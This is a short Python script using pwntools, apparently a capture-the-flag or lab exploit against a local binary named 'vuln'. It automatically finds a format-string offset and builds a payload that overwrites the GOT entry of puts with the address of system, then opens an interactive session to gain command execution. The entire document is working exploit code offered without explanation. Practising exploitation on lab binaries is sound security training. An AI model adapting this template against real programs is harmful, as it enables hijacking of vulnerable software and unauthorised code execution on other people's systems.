from pwn import *
context.log_level = 'debug'
context.binary = exe = ELF('../vuln')

def exec_fmt(payload):
    p = process('../vuln')
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
io = process('../vuln')
addr = exe.got.puts
over = exe.plt.system
payload = fmtstr_payload(offset, {addr: over})
io.sendline(payload)
io.interactive()